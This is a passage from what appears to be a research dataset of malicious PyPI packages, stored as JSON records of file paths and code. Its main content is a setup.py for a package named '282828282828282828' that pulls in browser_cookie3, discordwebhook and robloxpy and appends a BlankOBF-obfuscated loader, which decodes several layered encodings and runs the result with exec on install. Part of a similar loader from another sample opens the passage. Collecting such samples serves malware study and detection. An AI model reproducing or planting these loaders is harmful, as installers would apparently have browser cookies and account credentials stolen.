\x35\\\\66\\\\x36\\\\142\\\\x35\\\\x31\\\\62\\\\x66\\\\x35\\\\x38\\\\64\\\\66\\\\64\\\\x36\\\\64\\\\x31\\\\x35\\\\x31\\\\x36\\\\x63\\\\x36\\\\67\\\\x37\\\\x39\\\\x34\\\\145\\\\x35\\\\x35\\\\67\\\\63\\\\x33\\\\61\\\\x35\\\\x34\\\\65\\\\63\\\\x35\\\\61\\\\x37\\\\67\\\\x34\\\\x33\\\\x36\\\\142\\\\63\\\\61\\\\x34\\\\x39\\\\64\\\\142\\\\x34\\\\x33\\\\x37\\\\x37\\\\63\\\\x30\\\\64\\\\x65\\\\65\\\\x34\\\\65\\\\x35\\\\x36\\\\x64\\\\x34\\\\141\\\\x36\\\\141\\\\x33\\\\61\\\\x34\\\\62\\\\65\\\\x36\\\\66\\\\142\\\\x37\\\\x33\\\\x33\\\\62\\\\65\\\\x32\\\\65\\\\65\\\\x37\\\\x34\\\\64\\\\71\\\\150')\",\"\",_____.__name__));______________=_____(_______(\"\\x5f\\x5f\\137\\137\\137\\137\\x5f\\137\\x5f\\x5f\\x5f\\x2e\\144\\145\\x63\\157\\x64\\x65(b'\\\\142\\\\x65\\\\147\\\\151\\\\156\\\\x20\\\\x36\\\\66\\\\x36\\\\40\\\\74\\\\x64\\\\141\\\\x74\\\\141\\\\x3e\\\\12\\\\x4d\\\\x36\\\\x36\\\\125\\\\66\\\\x3b\\\\x46\\\\45\\\\x37\\\\x2d\\\\x26\\\\75\\\\56\\\\x3a\\\\105\\\\x44\\\\x52\\\\62\\\\64\\\\x31\\\\x58\\\\x3a\\\\125\\\\x45\\\\70\\\\64\\\\106\\\\101\\\\x30\\\\x39\\\\x57\\\\x21\\\\56\\\\x33\\\\64\\\\65\\\\66\\\\x32\\\\105\\\\x2d\\\\x23\\\\55\\\\47\\\\111\\\\x2a\\\\64\\\\x54\\\\x34\\\\x52\\\\x33\\\\x36\\\\x49\\\\x4b\\\\x3e\\\\x44\\\\131\\\\x4a\\\\x34\\\\x37\\\\x45\\\\x38\\\\12\\\\x4d\\\\61\\\\x34\\\\x34\\\\124\\\\63\\\\x44\\\\x2d\\\\x21\\\\72\\\\44\\\\135\\\\44\\\\71\\\\46\\\\x29\\\\x31\\\\x30\\\\126\\\\61\\\\x46\\\\65\\\\103\\\\x25\\\\117\\\\x3d\\\\x44\\\\110\\\\121\\\\x3d\\\\x24\\\\x29\\\\64\\\\x2c\\\\66\\\\x31\\\\x46\\\\64\\\\64\\\\55\\\\41\\\\72\\\\105\\\\100\\\\x51\\\\61\\\\x45\\\\x49\\\\60\\\\x2c\\\\x33\\\\x45\\\\x35\\\\62\\\\x34\\\\x31\\\\41\\\\x3c\\\\125\\\\65\\\\44\\\\x0a\\\\115\\\\x32\\\\105\\\\45\\\\54\\\\60\\\\124\\\\x29\\\\x21\\\\x33\\\\x34\\\\65\\\\x32\\\\x31\\\\64\\\\125\\\\45\\\\x33\\\\67\\\\101\\\\x23\\\\72\\\\123\\\\45\\\\45\\\\x32\\\\x46\\\\x4d\\\\46\\\\x32\\\\65\\\\51\\\\112\\\\62\\\\62\\\\115\\\\55\\\\76\\\\x44\\\\x55\\\\132\\\\65\\\\105\\\\x2d\\\\114\\\\x38\\\\64\\\\125\\\\x5a\\\\55\\\\x34\\\\x49\\\\63\\\\x35\\\\x34\\\\111\\\\44\\\\63\\\\126\\\\x4d\\\\71\\\\x0a\\\\x4d\\\\72\\\\x55\\\\101\\\\x34\\\\x31\\\\x45\\\\x49\\\\x2d\\\\65\\\\x47\\\\x21\\\\50\\\\64\\\\x44\\\\x31\\\\x50\\\\60\\\\64\\\\x5d\\\\x4a\\\\x3b\\\\127\\\\111\\\\x2d\\\\x35\\\\x36\\\\134\\\\x54\\\\x33\\\\65\\\\x2d\\\\62\\\\x35\\\\x44\\\\111\\\\111\\\\x3b\\\\44\\\\x25\\\\51\\\\x30\\\\x54\\\\45\\\\110\\\\62\\\\106\\\\x4d\\\\72\\\\60\\\\x45\\\\x2d\\\\x35\\\\x30\\\\66\\\\75\\\\x29\\\\60\\\\124\\\\51\\\\45\\\\12\\\\115\\\\65\\\\x44\\\\x35\\\\110\\\\x30\\\\104\\\\x55\\\\131\\\\x3b\\\\x54\\\\x4d\\\\64\\\\x35\\\\46\\\\135\\\\107\\\\x33\\\\x37\\\\105\\\\41\\\\x3a\\\\x24\\\\121\\\\x33\\\\75\\\\126\\\\x45\\\\52\\\\x3a\\\\x56\\\\61\\\\x29\\\\x32\\\\x34\\\\71\\\\x32\\\\62\\\\x25\\\\x2d\\\\43\\\\x3a\\\\45\\\\65\\\\57\\\\x34\\\\x57\\\\101\\\\x27\\\\64\\\\64\\\\x39\\\\110\\\\x34\\\\124\\\\135\\\\x33\\\\x3e\\\\x24\\\\x3d\\\\53\\\\12\\\\x4d\\\\x31\\\\104\\\\65\\\\x53\\\\x32\\\\64\\\\55\\\\x4c\\\\x31\\\\x35\\\\x35\\\\44\\\\63\\\\66\\\\135\\\\x29\\\\x31\\\\x26\\\\135\\\\123\\\\x32\\\\124\\\\71\\\\41\\\\72\\\\44\\\\x45\\\\131\\\\60\\\\63\\\\101\\\\x2f\\\\x34\\\\127\\\\x41\\\\47\\\\x33\\\\x37\\\\105\\\\61\\\\x2d\\\\45\\\\x29\\\\111\\\\x30\\\\66\\\\x4d\\\\65\\\\x3a\\\\x46\\\\x3d\\\\120\\\\64\\\\104\\\\55\\\\41\\\\x3d\\\\44\\\\x49\\\\x47\\\\12\\\\115\\\\x3c\\\\x24\\\\131\\\\52\\\\61\\\\46\\\\x3d\\\\x47\\\\x34\\\\x35\\\\65\\\\42\\\\x34\\\\44\\\\x5c\\\\121\\\\x33\\\\104\\\\121\\\\57\\\\64\\\\126\\\\x5c\\\\122\\\\x34\\\\125\\\\x39\\\\x21\\\\73\\\\x24\\\\111\\\\46\\\\x2c\\\\46\\\\x5d\\\\x29\\\\54\\\\65\\\\x49\\\\62\\\\x33\\\\46\\\\120\\\\x58\\\\x3d\\\\65\\\\61\\\\66\\\\x36\\\\63\\\\45\\\\x32\\\\x31\\\\x35\\\\65\\\\x4d\\\\64\\\\x56\\\\x45\\\\71\\\\x0a\\\\x4d\\\\54\\\\x35\\\\x31\\\\66\\\\x2d\\\\47\\\\61\\\\64\\\\x31\\\\67\\\\55\\\\110\\\\63\\\\x44\\\\64\\\\x51\\\\x35\\\\104\\\\x48\\\\120\\\\60\\\\x44\\\\131\\\\x34\\\\x3e\\\\x35\\\\45\\\\116\\\\x32\\\\x47\\\\105\\\\x57\\\\72\\\\45\\\\x35\\\\x35\\\\x39\\\\44\\\\x59\\\\70\\\\x35\\\\x46\\\\55\\\\x4c\\\\63\\\\105\\\\x2d\\\\66\\\\x31\\\\x44\\\\55\\\\x4b\\\\54\\\\x23\\\\71\\\\x2e\\\\x34\\\\123\\\\x21\\\\x48\\\\x0a\\\\x4d\\\\x33\\\\46\\\\x49\\\\120\\\\x36\\\\104\\\\x58\\\\x51\\\\73\\\\x25\\\\75\\\\61\\\\72\\\\x57\\\\74\\\\124\\\\62\\\\x56\\\\x4d\\\\110\\\\60\\\\65\\\\x25\\\\x4b\\\\x3c\\\\x24\\\\115\\\\53\\\\64\\\\125\\\\x34\\\\125\\\\63\\\\x57\\\\x45\\\\x50\\\\x33\\\\105\\\\x31\\\\113\\\\66\\\\x37\\\\x25\\\\57\\\\65\\\\x24\\\\125\\\\x4d\\\\63\\\\x53\\\\x21\\\\61\\\\73\\\\x24\\\\x55\\\\66\\\\x31\\\\x45\\\\x29\\\\x34\\\\x0a\\\\x4d\\\\72\\\\63\\\\105\\\\55\\\\x34\\\\46\\\\x4d\\\\x4b\\\\76\\\\45\\\\75\\\\43\\\\x34\\\\x37\\\\71\\\\x36\\\\76\\\\x44\\\\105\\\\113\\\\x34\\\\126\\\\x48\\\\121\\\\60\\\\64\\\\131\\\\x24\\\\x36\\\\104\\\\x4d\\\\70\\\\61\\\\x26\\\\121\\\\53\\\\65\\\\x34\\\\x35\\\\x43\\\\x32\\\\125\\\\x31\\\\63\\\\x39\\\\126\\\\x45\\\\x31\\\\61\\\\x36\\\\x3d\\\\x51\\\\x36\\\\x25\\\\x35\\\\x4f\\\\x39\\\\x55\\\\70\\\\x51\\\\x0a\\\\46\\\\60\\\\63\\\\x39\\\\x2c\\\\x30\\\\x55\\\\104\\\\117\\\\x0a\\\\40\\\\12\\\\x65\\\\156\\\\144\\\\x0a\\\\165')\",\"\",_____.__name__));_______________=_____(_______(\"\\163\\164\\162\\x2e\\x6a\\x6f\\151\\x6e('', \\133\\x5f\\137\\x5f\\137\\137\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x28\\170\\x29\\40\\x66\\x6f\\162\\x20\\x78\\x20\\151\\x6e\\x20\\133\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\54\\137\\x5f\\x5f\\137\\x5f\\137\\137\\137\\x5f\\137\\x5f\\137\\x5f\\137\\137\\137\\54\\137\\137\\137\\137\\x5f\\x5f\\137\\x5f\\137\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\137\\x5f\\x2c\\x5f\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\137\\137\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5d\\135)\",\"\", _____.__name__));________(___________________(____.decode(____.decode(______.b64decode(_________(_______________)), \"\\x75\\x75\"),\"\\x62\\x7a\\62\"),____________________)[_____(\"\\x46\\x61\\154\\x73\\145\")])"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-282828282828282828",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='282828282828282828', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n# Obfuscated with BlankOBF\n# https://github.com/Blank-c/BlankOBF\n_____=eval(\"\\145\\166\\x61\\x6c\");_______=_____(\"\\143\\x6f\\155\\x70\\151\\154\\x65\");______,____=_____(_______(\"\\137\\x5f\\x69\\x6d\\160\\x6f\\162\\x74\\x5f\\137\\50\\x27\\x62\\141\\x73\\145\\x36\\64\\x27\\x29\",\"\",_____.__name__)),_____(_______(\"\\137\\137\\151\\x6d\\160\\157\\x72\\164\\137\\137\\x28\\x27\\143\\x6f\\x64\\x65\\143\\163\\x27\\51\",\"\",_____.__name__));____________________=_____(\"'\\40\\x4d\\x58\\167\\x4f\\67\\66'\");________,_________,__________,___________=_____(_______(\"\\x65\\x78\\145\\143\",\"\",_____.__name__)),_____(_______(\"\\163\\164\\x72\\x2e\\145\\x6e\\x63\\x6f\\x64\\x65\",\"\",_____.__name__)),_____(_______(\"\\x69\\x73\\151\\156\\x73\\164\\141\\156\\143\\x65\",\"\",_____.__name__)),_____(_______(\"\\x62\\171\\x74\\x65\\x73\",\"\",_____.__name__))\ndef ___________________(__________, ___________):\n    __________=__________.decode()\n    _________=\"\"\n    if not ___________[False]==\"\\40\":\n        ___________=\"\\x20\"+___________\n    for _ in range(_____(\"\\x6c\\x65\\x6e\\50\\137\\137\\x5f\\137\\x5f\\x5f\\x5f\\137\\137\\x5f\\x29\")):\n        _________+=_____(\"\\x63\\150\\162\\x28\\157\\162\\x64\\x28\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\133\\137\\x5d\\51\\136\\x6f\\162\\144\\x28\\137\\137\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\133\\50\\x6c\\x65\\x6e\\50\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5f\\137\\137\\51\\x20\\55\\40\\x54\\x72\\x75\\x65\\x2a\\62\\51\\x20\\53\\40\\x54\\x72\\165\\145\\135\\x29\\51\")\n    return (_________,___________)\ndef ____________(_____________):\n    if(_____________[-True]!=_____(_______(\"'\\143\\137\\137\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\137\\x5f\\66\\x73\\x35\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\x36\\x61\\x72\\144\\166\\70'[-True*4]\",\"\",_____.__name__))):_____________ = _________(_____________)\n    if not(__________(_____________, ___________)):_____________ = _____(_______(\"\\137\\137\\x5f\\137\\56\\x64\\145\\x63\\157\\x64\\x65\\50\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\137\\137\\137\\137\\x5f\\x5f\\x5b\\x3a\\55\\124\\162\\x75\\145\\135,'\\162\\x6f\\x74\\x31\\63')\",\"\",_____.__name__))\n    else:\n        if(_____________[-True]==_____(_______(\"b'\\x66\\65\\163\\x66\\163\\144\\x66\\141\\x75\\x66\\x38\\x35'[-True*4]\",\"\", _____.__name__))):\n            _____________=_____(_______(\"\\x5f\\137\\x5f\\137\\x2e\\144\\x65\\x63\\157\\144\\145\\x28\\137\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\133\\72\\x2d\\124\\x72\\165\\x65\\x5d,'\\165\\x75')\",\"\",_____.__name__))\n        elif (_____________[-True] ==_____(_______(\"b'\\x64\\65\\163\\x66\\x73\\x31\\x64\\146\\x66\\x68\\163\\x64\\70'[-True*4]\",\"\", _____.__name__))):_____________=_____(_______(\"\\x5f\\x5f\\x5f\\137\\x2e\\144\\x65\\x63\\157\\x64\\x65\\50\\x5f\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\x5f\\137\\137\\x5f\\x5f\\x5b\\72\\55\\x54\\x72\\165\\x65\\x5d,'\\150\\145\\x78')\",\"\",_____.__name__))\n        else:_____________=_____(_______(\"\\x5f\\137\\137\\x5f\\137\\137\\x2e\\142\\x38\\x35\\x64\\145\\x63\\157\\144\\x65\\x28\\x5f\\137\\x5f\\137\\x5f\\x5f\\137\\x5f\\137\\137\\137\\137\\137\\133\\x3a\\x2d\\x54\\162\\165\\145\\x5d\\x29\",\"\",_____.__name__));_____________=_____(_______(\"\\x5f\\137\\137\\x5f\\56\\x64\\145\\x63\\x6f\\x64\\x65\\50\\137\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\137\\x5f\\137\\x5f, '\\150\\x65\\x78')\",\"\",_____.__name__))\n        _____________=_____(_______(\"\\x5f\\x5f\\x5f\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\56\\144\\x65\\x63\\x6f\\144\\145\\x28\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\137\\137\\x5f\\x5f\\x5f\\137\\x29\",\"\",_____.__name__))\n    return _____________\n_________________=_____(_______(\"\\x5f\\137\\137\\x5f\\137\\x5f\\137\\137\\137\\137\\x5f\\56\\x64\\x65\\143\\157\\144\\x65(b'\\\\110\\\\132\\\\145\\\\x34\\\\62\\\\x48\\\\x61\\\\122\\\\171\\\\x69\\\\107\\\\55\\\\105\\\\x59\\\\60\\\\x48\\\\x23\\\\x73\\\\171\\\\151\\\\110\\\\x38\\\\167\\\\120\\\\66\\\\110\\\\70\\\\x65\\\\x47\\\\60\\\\110\\\\x5a\\\\x65\\\\x34\\\\x31\\\\110\\\\x65\\\\170\\\\152\\\\x7e\\\\x48\\\\x23\\\\x39\\\\130\\\\x6b\\\\x47\\\\46\\\\63\\\\x5f\\\\x65\\\\107\\\\143\\\\161\\\\53\\\\143\\\\107\\\\143\\\\x59\\\\172\\\\x63\\\\110\\\\x23\\\\141\\\\156\\\\x35\\\\x48\\\\x65\\\\157\\\\x68\\\\x71\\\\110\\\\x65\\\\x6f\\\\x65\\\\62\\\\110\\\\x28\\\\x40\\\\156\\\\63\\\\x48\\\\50\\\\100\\\\x6b\\\\160\\\\x48\\\\70\\\\126\\\\103\\\\150\\\\110\\\\41\\\\77\\\\112\\\\64\\\\x48\\\\141\\\\122\\\\x70\\\\x68\\\\x48\\\\x39\\\\x30\\\\x6a\\\\x66\\\\x48\\\\x65\\\\x6f\\\\153\\\\x36\\\\107\\\\x63\\\\150\\\\172\\\\137\\\\x48\\\\70\\\\126\\\\x44\\\\65\\\\110\\\\x28\\\\x40\\\\x6d\\\\176\\\\x48\\\\70\\\\x56\\\\x39\\\\x62\\\\x48\\\\70\\\\x56\\\\x37\\\\x32\\\\107\\\\46\\\\115\\\\111\\\\x6a\\\\x47\\\\55\\\\x35\\\\123\\\\x30\\\\x48\\\\x38\\\\x56\\\\71\\\\176\\\\x48\\\\70\\\\x3f\\\\142\\\\70\\\\107\\\\x26\\\\104\\\\x33\\\\150\\\\x47\\\\x64\\\\64\\\\67\\\\x31\\\\x47\\\\x26\\\\126\\\\114\\\\x66\\\\x48\\\\x65\\\\x40\\\\x77\\\\x30\\\\x47\\\\46\\\\x4d\\\\x49\\\\x66\\\\x48\\\\x61\\\\x52\\\\x71\\\\65\\\\110\\\\145\\\\x6f\\\\x61\\\\x7c\\\\107\\\\143\\\\x68\\\\x24\\\\130\\\\x48\\\\145\\\\170\\\\145\\\\64\\\\x48\\\\41\\\\77\\\\114\\\\143\\\\x48\\\\x38\\\\x65\\\\x4a\\\\66\\\\110\\\\x23\\\\122\\\\x67\\\\x6d\\\\x47\\\\x63\\\\x59\\\\41\\\\x30\\\\110\\\\145\\\\100\\\\x77\\\\x30\\\\x48\\\\x28\\\\x40\\\\153\\\\x33\\\\x47\\\\x2b\\\\x7b\\\\x4d\\\\x30\\\\107\\\\143\\\\x59\\\\172\\\\144\\\\x48\\\\104\\\\x4e\\\\125\\\\x7b\\\\x47\\\\46\\\\64\\\\x30\\\\x7d\\\\x48\\\\132\\\\77\\\\125\\\\x63\\\\107\\\\x63\\\\131\\\\x24\\\\141\\\\x48\\\\104\\\\x4e\\\\123\\\\156\\\\110\\\\70\\\\x77\\\\126\\\\x38\\\\x48\\\\141\\\\71\\\\x67\\\\x6a\\\\x48\\\\x65\\\\x6f\\\\x6b\\\\x32\\\\x48\\\\x66\\\\x41\\\\50\\\\x73\\\\x47\\\\x26\\\\115\\\\111\\\\146\\\\110\\\\145\\\\x29\\\\156\\\\x70\\\\x47\\\\46\\\\104\\\\x33\\\\x61\\\\110\\\\70\\\\x65\\\\104\\\\x33\\\\107\\\\x26\\\\115\\\\106\\\\x69\\\\107\\\\x63\\\\150\\\\44\\\\143\\\\110\\\\x38\\\\x77\\\\122\\\\144\\\\107\\\\143\\\\x59\\\\x74\\\\175\\\\110\\\\x28\\\\100\\\\161\\\\x37\\\\107\\\\55\\\\x4e\\\\145\\\\62\\\\x48\\\\70\\\\x56\\\\71\\\\x7e\\\\110\\\\x38\\\\156\\\\x4c\\\\145\\\\110\\\\x38\\\\104\\\\63\\\\x5a\\\\107\\\\x2d\\\\127\\\\150\\\\x70\\\\107\\\\46\\\\x44\\\\x33\\\\x64\\\\x48\\\\145\\\\100\\\\x74\\\\x6e\\\\x48\\\\x28\\\\100\\\\x74\\\\x33\\\\x48\\\\43\\\\x73\\\\x7a\\\\67\\\\x47\\\\x26\\\\64\\\\x33\\\\x68\\\\x47\\\\55\\\\105\\\\126\\\\65\\\\x48\\\\x38\\\\126\\\\106\\\\152\\\\x48\\\\70\\\\167\\\\x50\\\\x35\\\\110\\\\145\\\\x78\\\\x6e\\\\162\\\\107\\\\x63\\\\53\\\\174\\\\143\\\\x48\\\\x65\\\\170\\\\153\\\\64\\\\x47\\\\x26\\\\104\\\\66\\\\x63\\\\110\\\\x23\\\\163\\\\x24\\\\x37\\\\x47\\\\x26\\\\145\\\\117\\\\147\\\\110\\\\x38\\\\x65\\\\x39\\\\132\\\\110\\\\x38\\\\77\\\\144\\\\x67\\\\x48\\\\145\\\\51\\\\x74\\\\163\\\\x47\\\\x64\\\\x4d\\\\x4c\\\\150\\\\x48\\\\50\\\\100\\\\156\\\\x6c\\\\x47\\\\46\\\\x44\\\\66\\\\141\\\\x47\\\\x26\\\\126\\\\x49\\\\x64\\\\x48\\\\132\\\\50\\\\117\\\\x6a\\\\107\\\\x63\\\\131\\\\x7a\\\\173\\\\x48\\\\145\\\\157\\\\x64\\\\176\\\\110\\\\70\\\\167\\\\x4f\\\\150\\\\110\\\\70\\\\x4d\\\\61\\\\62\\\\x48\\\\x28\\\\x40\\\\155\\\\x7e\\\\110\\\\x61\\\\x52\\\\x73\\\\150\\\\110\\\\x38\\\\156\\\\x4a\\\\63\\\\x48\\\\x61\\\\x49\\\\x6d\\\\x68\\\\107\\\\x63\\\\150\\\\44\\\\x60\\\\x47\\\\55\\\\x57\\\\x68\\\\156\\\\110\\\\x38\\\\167\\\\x58\\\\151\\\\110\\\\70\\\\103\\\\x5f\\\\x7e\\\\110\\\\50\\\\100\\\\152\\\\176\\\\107\\\\x25\\\\x5f\\\\x5f\\\\x64\\\\107\\\\x26\\\\x56\\\\x4d\\\\63\\\\107\\\\x63\\\\x59\\\\x77\\\\127\\\\x47\\\\x26\\\\x44\\\\x39\\\\x65\\\\x47\\\\46\\\\x33\\\\174\\\\141\\\\110\\\\145\\\\x78\\\\x64\\\\x7c\\\\110\\\\x38\\\\x43\\\\x5f\\\\175\\\\110\\\\x65\\\\x6f\\\\x61\\\\x7c\\\\x48\\\\x65\\\\x40\\\\167\\\\67\\\\107\\\\46\\\\x44\\\\x33\\\\145\\\\110\\\\70\\\\103\\\\137\\\\x66\\\\107\\\\46\\\\x4d\\\\103\\\\x66\\\\107\\\\x63\\\\140\\\\x33\\\\144\\\\x47\\\\x26\\\\x4d\\\\66\\\\x5a\\\\107\\\\x25\\\\x2b\\\\74\\\\x59\\\\110\\\\x65\\\\x6f\\\\142\\\\155\\\\110\\\\50\\\\100\\\\x6e\\\\x30\\\\107\\\\46\\\\104\\\\x41\\\\65\\\\107\\\\x63\\\\53\\\\174\\\\x59\\\\x48\\\\x65\\\\x78\\\\x6b\\\\154\\\\110\\\\132\\\\77\\\\125\\\\145\\\\x48\\\\50\\\\x40\\\\x68\\\\x35\\\\x47\\\\x25\\\\137\\\\137\\\\x61\\\\110\\\\145\\\\170\\\\x71\\\\60\\\\110\\\\132\\\\145\\\\x36\\\\x64\\\\107\\\\46\\\\115\\\\x44\\\\60\\\\x48\\\\x39\\\\60\\\\152\\\\150\\\\x48\\\\70\\\\145\\\\x4c\\\\x6a\\\\107\\\\x63\\\\150\\\\44\\\\x5a\\\\x48\\\\70\\\\x6e\\\\x52\\\\x6c\\\\x47\\\\46\\\\x33\\\\174\\\\x7e\\\\x47\\\\x26\\\\104\\\\63\\\\144\\\\x48\\\\x21\\\\77\\\\x4c\\\\141\\\\x47\\\\x26\\\\126\\\\x4f\\\\x6b\\\\107\\\\x63\\\\53\\\\174\\\\x63\\\\107\\\\x26\\\\x44\\\\103\\\\x69\\\\107\\\\143\\\\131\\\\164\\\\x7c\\\\107\\\\x26\\\\x44\\\\x36\\\\x69\\\\107\\\\143\\\\150\\\\172\\\\x60\\\\110\\\\x65\\\\x6f\\\\145\\\\62\\\\x48\\\\x61\\\\111\\\\153\\\\x34\\\\110\\\\x38\\\\126\\\\x39\\\\x65\\\\110\\\\43\\\\x6a\\\\166\\\\150\\\\x48\\\\70\\\\x6e\\\\106\\\\x64\\\\x48\\\\x21\\\\x77\\\\x37\\\\60\\\\110\\\\141\\\\x52\\\\x79\\\\x6c\\\\107\\\\x2d\\\\65\\\\123\\\\60\\\\110\\\\x38\\\\x65\\\\71\\\\131\\\\x47\\\\x63\\\\x59\\\\164\\\\x7d\\\\x48\\\\141\\\\122\\\\155\\\\x65\\\\x48\\\\141\\\\x39\\\\x67\\\\154\\\\110\\\\x61\\\\x52\\\\167\\\\70\\\\x47\\\\x63\\\\150\\\\x7a\\\\x7b\\\\107\\\\46\\\\104\\\\x36\\\\141\\\\110\\\\x65\\\\x78\\\\150\\\\x6c\\\\110\\\\145\\\\x6f\\\\x61\\\\x7d\\\\107\\\\x26\\\\x77\\\\131\\\\x34\\\\x47\\\\46\\\\x34\\\\63\\\\147\\\\x48\\\\146\\\\x41\\\\50\\\\x74\\\\x47\\\\x26\\\\x34\\\\66\\\\141\\\\x47\\\\x26\\\\x77\\\\x59\\\\64\\\\x47\\\\x63\\\\131\\\\44\\\\127\\\\107\\\\x2d\\\\127\\\\150\\\\160\\\\x48\\\\145\\\\170\\\\153\\\\60\\\\x48\\\\x5a\\\\145\\\\x36\\\\x65\\\\x47\\\\46\\\\x56\\\\106\\\\143\\\\110\\\\70\\\\x28\\\\x58\\\\152\\\\110\\\\x28\\\\x40\\\\161\\\\x36\\\\x48\\\\x61\\\\111\\\\153\\\\x38\\\\110\\\\x65\\\\170\\\\161\\\\70\\\\107\\\\x26\\\\167\\\\x61\\\\x68\\\\110\\\\70\\\\145\\\\106\\\\x67\\\\x48\\\\x5a\\\\156\\\\x43\\\\145\\\\x47\\\\46\\\\126\\\\x4c\\\\x6b\\\\110\\\\70\\\\x4d\\\\x30\\\\x67\\\\x47\\\\x63\\\\x68\\\\x2b\\\\142\\\\x47\\\\55\\\\116\\\\x62\\\\154\\\\110\\\\141\\\\122\\\\x73\\\\x6d\\\\107\\\\45\\\\53\\\\x2d\\\\60\\\\110\\\\141\\\\122\\\\x70\\\\157\\\\x48\\\\x23\\\\152\\\\x73\\\\x6f\\\\x47\\\\x26\\\\64\\\\63\\\\147\\\\x48\\\\x66\\\\101\\\\50\\\\164\\\\x47\\\\46\\\\104\\\\x30\\\\146\\\\x47\\\\107\\\\141\\\\x37\\\\x6a\\\\110\\\\x65\\\\x6f\\\\141\\\\175\\\\x47\\\\53\\\\x7b\\\\x4c\\\\x7b\\\\110\\\\70\\\\104\\\\x33\\\\132\\\\107\\\\45\\\\x5f\\\\x3f\\\\173\\\\x47\\\\x63\\\\x59\\\\x71\\\\141\\\\x47\\\\x47\\\\141\\\\x37\\\\x32\\\\x48\\\\145\\\\170\\\\150\\\\62\\\\107\\\\x63\\\\172\\\\77\\\\145\\\\107\\\\x63\\\\x68\\\\x2b\\\\130\\\\110\\\\x38\\\\x65\\\\103\\\\x7e\\\\x48\\\\145\\\\157\\\\150\\\\x31\\\\x48\\\\146\\\\x31\\\\172\\\\156\\\\x48\\\\141\\\\x52\\\\x73\\\\154\\\\x47\\\\x63\\\\140\\\\61\\\\63\\\\110\\\\x38\\\\x56\\\\x33\\\\142\\\\x48\\\\x21\\\\50\\\\x46\\\\150\\\\x48\\\\145\\\\x6f\\\\x68\\\\x6d\\\\x48\\\\145\\\\100\\\\x77\\\\x37\\\\x48\\\\145\\\\157\\\\x68\\\\x35\\\\x48\\\\146\\\\61\\\\172\\\\x71\\\\x48\\\\x28\\\\x40\\\\152\\\\176\\\\x47\\\\55\\\\65\\\\120\\\\151\\\\x47\\\\x26\\\\x4d\\\\101\\\\63\\\\x48\\\\x61\\\\x30\\\\x61\\\\x65\\\\110\\\\x65\\\\51\\\\x77\\\\x35\\\\107\\\\46\\\\x4d\\\\103\\\\x62\\\\x48\\\\x65\\\\x78\\\\x6e\\\\x32\\\\110\\\\x61\\\\122\\\\163\\\\150\\\\x48\\\\x38\\\\126\\\\x43\\\\x68\\\\x48\\\\41\\\\x77\\\\x37\\\\60\\\\x47\\\\46\\\\x34\\\\60\\\\175\\\\107\\\\x26\\\\x56\\\\111\\\\151\\\\107\\\\143\\\\131\\\\164\\\\125\\\\x47\\\\55\\\\x35\\\\120\\\\64\\\\107\\\\45\\\\53\\\\137\\\\x59\\\\x48\\\\x65\\\\51\\\\164\\\\62\\\\x48\\\\145\\\\x40\\\\167\\\\x31\\\\107\\\\55\\\\x33\\\\x78')\",\"\",_____.__name__));________________ = _____(_______(\"\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\137\\137\\x5f\\x2e\\x64\\145\\x63\\157\\144\\x65(b'\\\\x76\\\\x57\\\\131\\\\x47\\\\x6d\\\\70\\\\x69\\\\130\\\\107\\\\110\\\\171\\\\110\\\\167\\\\132\\\\x32\\\\x57\\\\x50\\\\126\\\\64\\\\110\\\\120\\\\114\\\\x75\\\\111\\\\x78\\\\143\\\\x50\\\\104\\\\x48\\\\x49\\\\157\\\\111\\\\121\\\\105\\\\x53\\\\x47\\\\x52\\\\x74\\\\61\\\\104\\\\171\\\\x4d\\\\x50\\\\130\\\\x47\\\\104\\\\71\\\\126\\\\155\\\\164\\\\x35\\\\x58\\\\x48\\\\111\\\\x55\\\\126\\\\x52\\\\x44\\\\x6a\\\\x48\\\\104\\\\x63\\\\x41\\\\x45\\\\106\\\\114\\\\x64\\\\x46\\\\166\\\\147\\\\x54\\\\107\\\\x48\\\\x45\\\\x43\\\\102\\\\x6d\\\\x70\\\\x34\\\\x58\\\\x50\\\\x44\\\\60\\\\127\\\\x76\\\\x78\\\\53\\\\x49\\\\x48\\\\115\\\\102\\\\x45\\\\170\\\\64\\\\x74\\\\x4a\\\\170\\\\60\\\\x77\\\\x46\\\\171\\\\123\\\\x55\\\\103\\\\x46\\\\x6b\\\\112\\\\x49\\\\121\\\\132\\\\x35\\\\107\\\\121\\\\146\\\\x78\\\\x41\\\\x52\\\\71\\\\162\\\\113\\\\170\\\\x31\\\\x47\\\\x4b\\\\166\\\\65\\\\x53\\\\x44\\\\60\\\\x70\\\\x32\\\\x56\\\\x79\\\\x34\\\\67\\\\101\\\\166\\\\x48\\\\x69\\\\x45\\\\x76\\\\105\\\\124\\\\120\\\\x78\\\\x30\\\\152\\\\x46\\\\122\\\\142\\\\x66\\\\x46\\\\121\\\\x53\\\\x47\\\\106\\\\x31\\\\117\\\\120\\\\126\\\\x46\\\\x44\\\\x7a\\\\x46\\\\154\\\\x56\\\\142\\\\x42\\\\x50\\